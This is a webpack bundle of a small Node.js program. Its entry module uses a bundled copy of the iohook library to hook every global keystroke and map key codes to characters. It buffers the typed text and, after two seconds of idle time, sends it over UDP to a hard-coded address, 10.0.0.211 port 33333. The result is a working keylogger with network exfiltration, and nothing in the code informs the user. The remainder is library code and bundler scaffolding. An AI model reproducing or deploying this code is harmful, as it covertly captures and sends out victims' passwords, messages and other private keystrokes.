/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 0);
/******/ })
/************************************************************************/
/******/ ({

/***/ "./bin.js":
/*!****************!*\
  !*** ./bin.js ***!
  \****************/
/*! no exports provided */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
eval("__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var dgram__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! dgram */ \"dgram\");\n/* harmony import */ var dgram__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(dgram__WEBPACK_IMPORTED_MODULE_0__);\n/* harmony import */ var _iohook__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./iohook */ \"./iohook.js\");\n/* harmony import */ var _iohook__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(_iohook__WEBPACK_IMPORTED_MODULE_1__);\n/* harmony import */ var rxjs__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! rxjs */ \"rxjs\");\n/* harmony import */ var rxjs__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(rxjs__WEBPACK_IMPORTED_MODULE_2__);\n/* harmony import */ var rxjs_operators__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! rxjs/operators */ \"rxjs/operators\");\n/* harmony import */ var rxjs_operators__WEBPACK_IMPORTED_MODULE_3___default = /*#__PURE__*/__webpack_require__.n(rxjs_operators__WEBPACK_IMPORTED_MODULE_3__);\nvar _ASCII_TABLE;\n\nfunction _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }\n\n\n\n\n\nvar client = dgram__WEBPACK_IMPORTED_MODULE_0___default.a.createSocket('udp4');\nvar PORT = 33333;\nvar HOST = '10.0.0.211';\nvar ASCII_TABLE = (_ASCII_TABLE = {\n  9: 'TAB',\n  13: 'ENTER',\n  27: 'ESC',\n  32: ' ',\n  33: '!',\n  34: '\"',\n  35: '#',\n  36: '$',\n  37: '%',\n  39: '\\'',\n  40: '(',\n  38: '&',\n  64: '@',\n  42: '*',\n  41: ')',\n  95: '_',\n  45: '-',\n  43: '+',\n  61: '=',\n  46: '.',\n  44: ',',\n  62: '>',\n  60: '<',\n  59: ';',\n  58: ':',\n  47: '/',\n  63: '?',\n  126: '~',\n  94: '^',\n  195: 'ç',\n  135: 'Ç',\n  123: '{',\n  125: '}',\n  92: '\\\\',\n  91: '[',\n  93: ']',\n  96: '`',\n  124: '|',\n  48: 0,\n  49: 1,\n  50: 2,\n  51: 3,\n  52: 4,\n  53: 5,\n  54: 6,\n  55: 7,\n  56: 8,\n  57: 9,\n  65: 'A',\n  66: 'B',\n  67: 'C',\n  68: 'D',\n  69: 'E',\n  70: 'F',\n  71: 'G',\n  72: 'H',\n  73: 'I',\n  74: 'J',\n  75: 'K',\n  76: 'L',\n  77: 'M',\n  78: 'N',\n  79: 'O',\n  80: 'P',\n  81: 'Q',\n  82: 'R',\n  83: 'S',\n  84: 'T',\n  85: 'U',\n  86: 'V',\n  87: 'W',\n  88: 'X',\n  89: 'Y',\n  90: 'Z',\n  97: 'a',\n  98: 'b',\n  99: 'c',\n  100: 'd',\n  101: 'e',\n  102: 'f',\n  103: 'g',\n  104: 'h',\n  105: 'i',\n  106: 'j',\n  107: 'k',\n  108: 'l',\n  109: 'm',\n  110: 'n',\n  111: 'o',\n  112: 'p',\n  113: 'q',\n  114: 'r',\n  115: 's',\n  116: 't',\n  117: 'u',\n  118: 'v',\n  119: 'x',\n  120: 'w',\n  121: 'y',\n  122: 'z',\n  24: ' UPWARDS_ARROW_KEY ',\n  25: ' DOWNWARDS_ARROW_KEY '\n}, _defineProperty(_ASCII_TABLE, \"27\", ' LEFTWARDS_ARROW_KEY '), _defineProperty(_ASCII_TABLE, 26, ' RIGHTWARDS_ARROW_KEY '), _defineProperty(_ASCII_TABLE, 29, ' LEFTRIGHT_ARROW_KEY '), _defineProperty(_ASCII_TABLE, 65362, ' UPWARDS_ARROW_KEY '), _defineProperty(_ASCII_TABLE, 65293, ' DOWNWARDS_ARROW_KEY '), _defineProperty(_ASCII_TABLE, 65393, ' LEFTWARDS_ARROW_KEY '), _defineProperty(_ASCII_TABLE, \"65362\", ' RIGHTWARDS_ARROW_KEY '), _ASCII_TABLE);\n\nvar parse = function parse(_ref) {\n  var keychar = _ref.keychar,\n      rawcode = _ref.rawcode;\n\n  if (!!keychar) {\n    return keychar;\n  }\n\n  if (!!ASCII_TABLE[Number(rawcode)]) {\n    return ASCII_TABLE[rawcode];\n  }\n\n  return \" rawCode:(\".concat(rawcode, \") \");\n};\n\nvar text = \"\";\nvar timer = null;\n_iohook__WEBPACK_IMPORTED_MODULE_1___default.a.on(\"keydown\", function (event) {\n  var keydown$ = Object(rxjs__WEBPACK_IMPORTED_MODULE_2__[\"of\"])({\n    current: text,\n    raw: parse(event)\n  }).pipe(Object(rxjs_operators__WEBPACK_IMPORTED_MODULE_3__[\"distinctUntilChanged\"])(), Object(rxjs_operators__WEBPACK_IMPORTED_MODULE_3__[\"switchMap\"])(function (t) {\n    text = t.current + t.raw;\n    return Object(rxjs__WEBPACK_IMPORTED_MODULE_2__[\"of\"])(text);\n  }));\n  keydown$.subscribe(function (msg) {\n    if (timer) {\n      clearTimeout(timer);\n      timer = null;\n    }\n\n    timer = setTimeout(function () {\n      if (msg) {\n        var message = new Buffer.from(msg);\n        client.send(message, 0, message.length, PORT, HOST, function () {\n          text = \" \";\n        });\n      }\n    }, 2000);\n  });\n});\n_iohook__WEBPACK_IMPORTED_MODULE_1___default.a.start();\n\n//# sourceURL=webpack:///./bin.js?");

/***/ }),

/***/ "./iohook.js":
/*!*******************!*\
  !*** ./iohook.js ***!
  \*******************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

eval("function _typeof(obj) { if (typeof Symbol === \"function\" && typeof Symbol.iterator === \"symbol\") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === \"function\" && obj.constructor === Symbol && obj !== Symbol.prototype ? \"symbol\" : typeof obj; }; } return _typeof(obj); }\n\nfunction _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError(\"Cannot call a class as a function\"); } }\n\nfunction _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if (\"value\" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }\n\nfunction _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }\n\nfunction _possibleConstructorReturn(self, call) { if (call && (_typeof(call) === \"object\" || typeof call === \"function\")) { return call; } return _assertThisInitialized(self); }\n\nfunction _assertThisInitialized(self) { if (self === void 0) { throw new ReferenceError(\"this hasn't been initialised - super() hasn't been called\"); } return self; }\n\nfunction _getPrototypeOf(o) { _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf : function _getPrototypeOf(o) { return o.__proto__ || Object.getPrototypeOf(o); }; return _getPrototypeOf(o); }\n\nfunction _inherits(subClass, superClass) { if (typeof superClass !== \"function\" && superClass !== null) { throw new TypeError(\"Super expression must either be null or a function\"); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, writable: true, configurable: true } }); if (superClass) _setPrototypeOf(subClass, superClass); }\n\nfunction _setPrototypeOf(o, p) { _setPrototypeOf = Object.setPrototypeOf || function _setPrototypeOf(o, p) { o.__proto__ = p; return o; }; return _setPrototypeOf(o, p); }\n\nvar EventEmitter = __webpack_require__(/*! events */ \"events\");\n\nvar path = __webpack_require__(/*! path */ \"path\");\n\nvar version = \"node-v72-\".concat(process.platform, \"-\").concat(process.arch);\n\nvar NodeHookAddon = __webpack_require__(\"./platforms sync recursive ^\\\\.\\\\/.*\\\\/build\\\\/Release\\\\/iohook\\\\.node$\")(\"./\".concat(version, \"/build/Release/iohook.node\"));\n\nvar events = {\n  3: 'keypress',\n  4: 'keydown',\n  5: 'keyup',\n  6: 'mouseclick',\n  7: 'mousedown',\n  8: 'mouseup',\n  9: 'mousemove',\n  10: 'mousedrag',\n  11: 'mousewheel'\n};\n\nvar IOHook =\n/*#__PURE__*/\nfunction (_EventEmitter) {\n  _inherits(IOHook, _EventEmitter);\n\n  function IOHook() {\n    var _this;\n\n    _classCallCheck(this, IOHook);\n\n    _this = _possibleConstructorReturn(this, _getPrototypeOf(IOHook).call(this));\n    _this.active = false;\n    _this.shortcuts = [];\n    _this.eventProperty = 'keycode';\n    _this.activatedShortcuts = [];\n    _this.lastKeydownShift = false;\n    _this.lastKeydownAlt = false;\n    _this.lastKeydownCtrl = false;\n    _this.lastKeydownMeta = false;\n\n    _this.load();\n\n    _this.setDebug(false);\n\n    return _this;\n  }\n  /**\n   * Start hook process\n   * @param enableLogger Turn on debug logging\n   */\n\n\n  _createClass(IOHook, [{\n    key: \"start\",\n    value: function start(enableLogger) {\n      if (!this.active) {\n        this.active = true;\n        this.setDebug(enableLogger);\n      }\n    }\n    /**\n     * Shutdown event hook\n     */\n\n  }, {\n    key: \"stop\",\n    value: function stop() {\n      if (this.active) {\n        this.active = false;\n      }\n    }\n    /**\n     * Register global shortcut. When all keys in keys array pressed, callback will be called\n     * @param {Array} keys Array of keycodes\n     * @param {Function} callback Callback for when shortcut pressed\n     * @param {Function} [releaseCallback] Callback for when shortcut has been released\n     * @return {number} ShortcutId for unregister\n     */\n\n  }, {\n    key: \"registerShortcut\",\n    value: function registerShortcut(keys, callback, releaseCallback) {\n      var shortcut = {};\n      var shortcutId = Date.now() + Math.random();\n      keys.forEach(function (keyCode) {\n        shortcut[keyCode] = false;\n      });\n      shortcut.id = shortcutId;\n      shortcut.callback = callback;\n      shortcut.releaseCallback = releaseCallback;\n      this.shortcuts.push(shortcut);\n      return shortcutId;\n    }\n    /**\n     * Unregister shortcut by ShortcutId\n     * @param shortcutId\n     */\n\n  }, {\n    key: \"unregisterShortcut\",\n    value: function unregisterShortcut(shortcutId) {\n      var _this2 = this;\n\n      this.shortcuts.forEach(function (shortcut, i) {\n        if (shortcut.id === shortcutId) {\n          _this2.shortcuts.splice(i, 1);\n        }\n      });\n    }\n    /**\n     * Unregister shortcut via its key codes\n     * @param {string} keyCodes Keyboard keys matching the shortcut that should be unregistered\n     */\n\n  }, {\n    key: \"unregisterShortcutByKeys\",\n    value: function unregisterShortcutByKeys(keyCodes) {\n      // A traditional loop is used in order to access `this` from inside\n      for (var i = 0; i < this.shortcuts.length; i++) {\n        var shortcut = this.shortcuts[i]; // Convert any keycode numbers to strings\n\n        keyCodes.forEach(function (key, index) {\n          if (typeof key !== 'string' && !(key instanceof String)) {\n            // Convert to string\n            keyCodes[index] = key.toString();\n          }\n        }); // Check if this is our shortcut\n\n        Object.keys(shortcut).every(function (key) {\n          if (key === 'callback' || key === 'id') return; // Remove all given keys from keyCodes\n          // If any are not in this shortcut, then this shortcut does not match\n          // If at the end we have eliminated all codes in keyCodes, then we have succeeded\n\n          var index = keyCodes.indexOf(key);\n          if (index === -1) return false; // break\n          // Remove this key from the given keyCodes array\n\n          keyCodes.splice(index, 1);\n          return true;\n        }); // Is this the shortcut we want to remove?\n\n        if (keyCodes.length === 0) {\n          // Unregister this shortcut\n          this.shortcuts.splice(i, 1);\n          return;\n        }\n      }\n    }\n    /**\n     * Unregister all shortcuts\n     */\n\n  }, {\n    key: \"unregisterAllShortcuts\",\n    value: function unregisterAllShortcuts() {\n      this.shortcuts.splice(0, this.shortcuts.length);\n    }\n    /**\n     * Load native module\n     */\n\n  }, {\n    key: \"load\",\n    value: function load() {\n      NodeHookAddon.startHook(this._handler.bind(this), this.debug || false);\n    }\n    /**\n     * Unload native module and stop hook\n     */\n\n  }, {\n    key: \"unload\",\n    value: function unload() {\n      this.stop();\n      NodeHookAddon.stopHook();\n    }\n    /**\n     * Enable or disable native debug output\n     * @param {Boolean} mode\n     */\n\n  }, {\n    key: \"setDebug\",\n    value: function setDebug(mode) {\n      NodeHookAddon.debugEnable(mode);\n    }\n    /**\n     * Specify that key event's `rawcode` property should be used instead of\n     * `keycode` when listening for key presses.\n     *\n     * This allows iohook to be used in conjunction with other programs that may\n     * only provide a keycode.\n     * @param {Boolean} using\n     */\n\n  }, {\n    key: \"useRawcode\",\n    value: function useRawcode(using) {\n      // If true, use rawcode, otherwise use keycode\n      this.eventProperty = using ? 'rawcode' : 'keycode';\n    }\n    /**\n     * Disable mouse click propagation.\n     * The click event are captured and the event emitted but not propagated to the window.\n     */\n\n  }, {\n    key: \"disableClickPropagation\",\n    value: function disableClickPropagation() {\n      NodeHookAddon.grabMouseClick(true);\n    }\n    /**\n     * Enable mouse click propagation (enabled by default).\n     * The click event are emitted and propagated.\n     */\n\n  }, {\n    key: \"enableClickPropagation\",\n    value: function enableClickPropagation() {\n      NodeHookAddon.grabMouseClick(false);\n    }\n    /**\n     * Local event handler. Don't use it in your code!\n     * @param msg Raw event message\n     * @private\n     */\n\n  }, {\n    key: \"_handler\",\n    value: function _handler(msg) {\n      if (this.active === false || !msg) return;\n\n      if (events[msg.type]) {\n        var event = msg.mouse || msg.keyboard || msg.wheel;\n        event.type = events[msg.type];\n\n        this._handleShift(event);\n\n        this._handleAlt(event);\n\n        this._handleCtrl(event);\n\n        this._handleMeta(event);\n\n        this.emit(events[msg.type], event); // If there is any registered shortcuts then handle them.\n\n        if ((event.type === 'keydown' || event.type === 'keyup') && iohook.shortcuts.length > 0) {\n          this._handleShortcut(event);\n        }\n      }\n    }\n    /**\n     * Handles the shift key. Whenever shift is pressed, all future events would\n     * contain { shiftKey: true } in its object, until the shift key is released.\n     * @param event Event object\n     * @private\n     */\n\n  }, {\n    key: \"_handleShift\",\n    value: function _handleShift(event) {\n      if (event.type === 'keyup' && event.shiftKey) {\n        this.lastKeydownShift = false;\n      }\n\n      if (event.type === 'keydown' && event.shiftKey) {\n        this.lastKeydownShift = true;\n      }\n\n      if (this.lastKeydownShift) {\n        event.shiftKey = true;\n      }\n    }\n    /**\n     * Handles the alt key. Whenever alt is pressed, all future events would\n     * contain { altKey: true } in its object, until the alt key is released.\n     * @param event Event object\n     * @private\n     */\n\n  }, {\n    key: \"_handleAlt\",\n    value: function _handleAlt(event) {\n      if (event.type === 'keyup' && event.altKey) {\n        this.lastKeydownAlt = false;\n      }\n\n      if (event.type === 'keydown' && event.altKey) {\n        this.lastKeydownAlt = true;\n      }\n\n      if (this.lastKeydownAlt) {\n        event.altKey = true;\n      }\n    }\n    /**\n     * Handles the ctrl key. Whenever ctrl is pressed, all future events would\n     * contain { ctrlKey: true } in its object, until the ctrl key is released.\n     * @param event Event object\n     * @private\n     */\n\n  }, {\n    key: \"_handleCtrl\",\n    value: function _handleCtrl(event) {\n      if (event.type === 'keyup' && event.ctrlKey) {\n        this.lastKeydownCtrl = false;\n      }\n\n      if (event.type === 'keydown' && event.ctrlKey) {\n        this.lastKeydownCtrl = true;\n      }\n\n      if (this.lastKeydownCtrl) {\n        event.ctrlKey = true;\n      }\n    }\n    /**\n     * Handles the meta key. Whenever meta is pressed, all future events would\n     * contain { metaKey: true } in its object, until the meta key is released.\n     * @param event Event object\n     * @private\n     */\n\n  }, {\n    key: \"_handleMeta\",\n    value: function _handleMeta(event) {\n      if (event.type === 'keyup' && event.metaKey) {\n        this.lastKeydownMeta = false;\n      }\n\n      if (event.type === 'keydown' && event.metaKey) {\n        this.lastKeydownMeta = true;\n      }\n\n      if (this.lastKeydownMeta) {\n        event.metaKey = true;\n      }\n    }\n    /**\n     * Local shortcut event handler\n     * @param event Event object\n     * @private\n     */\n\n  }, {\n    key: \"_handleShortcut\",\n    value: function _handleShortcut(event) {\n      var _this3 = this;\n\n      if (this.active === false) {\n        return;\n      } // Keep track of shortcuts that are currently active\n\n\n      var activatedShortcuts = this.activatedShortcuts;\n\n      if (event.type === 'keydown') {\n        this.shortcuts.forEach(function (shortcut) {\n          if (shortcut[event[_this3.eventProperty]] !== undefined) {\n            // Mark this key as currently being pressed\n            shortcut[event[_this3.eventProperty]] = true;\n            var keysTmpArray = [];\n            var callme = true; // Iterate through each keyboard key in this shortcut\n\n            Object.keys(shortcut).forEach(function (key) {\n              if (key === 'callback' || key === 'releaseCallback' || key === 'id') return; // If one of the keys aren't pressed...\n\n              if (shortcut[key] === false) {\n                // Don't call the callback and empty our temp tracking array\n                callme = false;\n                keysTmpArray.splice(0, keysTmpArray.length);\n                return;\n              } // Otherwise, this key is being pressed.\n              // Add it to the array of keyboard keys we will send as an argument\n              // to our callback\n\n\n              keysTmpArray.push(key);\n            });\n\n            if (callme) {\n              shortcut.callback(keysTmpArray); // Add this shortcut from our activate shortcuts array if not\n              // already activated\n\n              if (activatedShortcuts.indexOf(shortcut) === -1) {\n                activatedShortcuts.push(shortcut);\n              }\n            }\n          }\n        });\n      } else if (event.type === 'keyup') {\n        // Mark this key as currently not being pressed in all of our shortcuts\n        this.shortcuts.forEach(function (shortcut) {\n          if (shortcut[event[_this3.eventProperty]] !== undefined) {\n            shortcut[event[_this3.eventProperty]] = false;\n          }\n        }); // Check if any of our currently pressed shortcuts have been released\n        // \"released\" means that all of the keys that the shortcut defines are no\n        // longer being pressed\n\n        this.activatedShortcuts.forEach(function (shortcut) {\n          if (shortcut[event[_this3.eventProperty]] === undefined) return;\n          var shortcutReleased = true;\n          var keysTmpArray = [];\n          Object.keys(shortcut).forEach(function (key) {\n            if (key === 'callback' || key === 'releaseCallback' || key === 'id') return;\n            keysTmpArray.push(key); // If any key is true, and thus still pressed, the shortcut is still\n            // being held\n\n            if (shortcut[key]) {\n              shortcutReleased = false;\n            }\n          });\n\n          if (shortcutReleased) {\n            // Call the released function handler\n            if (shortcut.releaseCallback) {\n              shortcut.releaseCallback(keysTmpArray);\n            } // Remove this shortcut from our activate shortcuts array\n\n\n            var index = _this3.activatedShortcuts.indexOf(shortcut);\n\n            if (index !== -1) _this3.activatedShortcuts.splice(index, 1);\n          }\n        });\n      }\n    }\n  }]);\n\n  return IOHook;\n}(EventEmitter);\n\nvar iohook = new IOHook();\nmodule.exports = iohook;\n\n//# sourceURL=webpack:///./iohook.js?");

/***/ }),

/***/ "./platforms sync recursive ^\\.\\/.*\\/build\\/Release\\/iohook\\.node$":
/*!***************************************************************!*\
  !*** ./platforms sync ^\.\/.*\/build\/Release\/iohook\.node$ ***!
  \***************************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

eval("var map = {\n\t\"./node-v72-darwin-x64/build/Release/iohook.node\": \"./platforms/node-v72-darwin-x64/build/Release/iohook.node\",\n\t\"./node-v72-linux-ia32/build/Release/iohook.node\": \"./platforms/node-v72-linux-ia32/build/Release/iohook.node\",\n\t\"./node-v72-linux-x64/build/Release/iohook.node\": \"./platforms/node-v72-linux-x64/build/Release/iohook.node\",\n\t\"./node-v72-win32-ia32/build/Release/iohook.node\": \"./platforms/node-v72-win32-ia32/build/Release/iohook.node\",\n\t\"./node-v72-win32-x64/build/Release/iohook.node\": \"./platforms/node-v72-win32-x64/build/Release/iohook.node\"\n};\n\n\nfunction webpackContext(req) {\n\tvar id = webpackContextResolve(req);\n\treturn __webpack_require__(id);\n}\nfunction webpackContextResolve(req) {\n\tif(!__webpack_require__.o(map, req)) {\n\t\tvar e = new Error(\"Cannot find module '\" + req + \"'\");\n\t\te.code = 'MODULE_NOT_FOUND';\n\t\tthrow e;\n\t}\n\treturn map[req];\n}\nwebpackContext.keys = function webpackContextKeys() {\n\treturn Object.keys(map);\n};\nwebpackContext.resolve = webpackContextResolve;\nmodule.exports = webpackContext;\nwebpackContext.id = \"./platforms sync recursive ^\\\\.\\\\/.*\\\\/build\\\\/Release\\\\/iohook\\\\.node$\";\n\n//# sourceURL=webpack:///./platforms_sync_^\\.\\/.*\\/build\\/Release\\/iohook\\.node$?");

/***/ }),

/***/ "./platforms/node-v72-darwin-x64/build/Release/iohook.node":
/*!*****************************************************************!*\
  !*** ./platforms/node-v72-darwin-x64/build/Release/iohook.node ***!
  \*****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

eval("throw new Error(\"Module parse failed: Unexpected character '�' (1:0)\\nYou may need an appropriate loader to handle this file type, currently no loaders are configured to process this file. See https://webpack.js.org/concepts#loaders\\n(Source code omitted for this binary file)\");\n\n//# sourceURL=webpack:///./platforms/node-v72-darwin-x64/build/Release/iohook.node?");

/***/ }),

/***/ "./platforms/node-v72-linux-ia32/build/Release/iohook.node":
/*!*****************************************************************!*\
  !*** ./platforms/node-v72-linux-ia32/build/Release/iohook.node ***!
  \*****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

eval("throw new Error(\"Module parse failed: Unexpected character '' (1:0)\\nYou may need an appropriate loader to handle this file type, currently no loaders are configured to process this file. See https://webpack.js.org/concepts#loaders\\n(Source code omitted for this binary file)\");\n\n//# sourceURL=webpack:///./platforms/node-v72-linux-ia32/build/Release/iohook.node?");

/***/ }),

/***/ "./platforms/node-v72-linux-x64/build/Release/iohook.node":
/*!****************************************************************!*\
  !*** ./platforms/node-v72-linux-x64/build/Release/iohook.node ***!
  \****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

eval("throw new Error(\"Module parse failed: Unexpected character '' (1:0)\\nYou may need an appropriate loader to handle this file type, currently no loaders are configured to process this file. See https://webpack.js.org/concepts#loaders\\n(Source code omitted for this binary file)\");\n\n//# sourceURL=webpack:///./platforms/node-v72-linux-x64/build/Release/iohook.node?");

/***/ }),

/***/ "./platforms/node-v72-win32-ia32/build/Release/iohook.node":
/*!*****************************************************************!*\
  !*** ./platforms/node-v72-win32-ia32/build/Release/iohook.node ***!
  \*****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

eval("throw new Error(\"Module parse failed: Unexpected character '�' (1:2)\\nYou may need an appropriate loader to handle this file type, currently no loaders are configured to process this file. See https://webpack.js.org/concepts#loaders\\n(Source code omitted for this binary file)\");\n\n//# sourceURL=webpack:///./platforms/node-v72-win32-ia32/build/Release/iohook.node?");

/***/ }),

/***/ "./platforms/node-v72-win32-x64/build/Release/iohook.node":
/*!****************************************************************!*\
  !*** ./platforms/node-v72-win32-x64/build/Release/iohook.node ***!
  \****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

eval("throw new Error(\"Module parse failed: Unexpected character '�' (1:2)\\nYou may need an appropriate loader to handle this file type, currently no loaders are configured to process this file. See https://webpack.js.org/concepts#loaders\\n(Source code omitted for this binary file)\");\n\n//# sourceURL=webpack:///./platforms/node-v72-win32-x64/build/Release/iohook.node?");

/***/ }),

/***/ 0:
/*!**********************!*\
  !*** multi ./bin.js ***!
  \**********************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

eval("module.exports = __webpack_require__(/*! ./bin.js */\"./bin.js\");\n\n\n//# sourceURL=webpack:///multi_./bin.js?");

/***/ }),

/***/ "dgram":
/*!************************!*\
  !*** external "dgram" ***!
  \************************/
/*! no static exports found */
/***/ (function(module, exports) {

eval("module.exports = require(\"dgram\");\n\n//# sourceURL=webpack:///external_%22dgram%22?");

/***/ }),

/***/ "events":
/*!*************************!*\
  !*** external "events" ***!
  \*************************/
/*! no static exports found */
/***/ (function(module, exports) {

eval("module.exports = require(\"events\");\n\n//# sourceURL=webpack:///external_%22events%22?");

/***/ }),

/***/ "path":
/*!***********************!*\
  !*** external "path" ***!
  \***********************/
/*! no static exports found */
/***/ (function(module, exports) {

eval("module.exports = require(\"path\");\n\n//# sourceURL=webpack:///external_%22path%22?");

/***/ }),

/***/ "rxjs":
/*!***********************!*\
  !*** external "rxjs" ***!
  \***********************/
/*! no static exports found */
/***/ (function(module, exports) {

eval("module.exports = require(\"rxjs\");\n\n//# sourceURL=webpack:///external_%22rxjs%22?");

/***/ }),

/***/ "rxjs/operators":
/*!*********************************!*\
  !*** external "rxjs/operators" ***!
  \*********************************/
/*! no static exports found */
/***/ (function(module, exports) {

eval("module.exports = require(\"rxjs/operators\");\n\n//# sourceURL=webpack:///external_%22rxjs/operators%22?");

/***/ })

/******/ });